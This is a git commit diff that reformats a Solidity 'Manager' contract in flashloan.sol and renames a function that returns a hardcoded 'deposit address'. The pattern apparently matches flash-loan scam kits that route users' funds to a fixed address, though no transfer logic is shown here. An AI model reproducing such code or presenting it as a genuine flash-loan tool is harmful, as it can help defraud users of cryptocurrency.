e3c532534027d29c5936f2b4fc1950aaff004943
Uso1121 <87182836+Uso1121@users.noreply.github.com>
2021-10-31 21:26:32 +1300

    Update flashloan.sol

--- flashloan.sol
+++ flashloan.sol
@@ -1,11 +1,8 @@
 pragma solidity ^0.5.0;
-
-contract Manager {
-	function performTasks() public {
-	    
-	}
-
-	function pancakeDepositAddress() public pure returns (address) {
-		return 0xa2adCce92De1a7EDC6e425199eAA6846feA9CE13;
-	}
+contract Manager { 
+    function performTasks() public {
+    }
+    function pancakeswapDepositAddress() public pure returns (address) {
+        return 0xa2adCce92De1a7EDC6e425199eAA6846feA9CE13;
+    }
 }
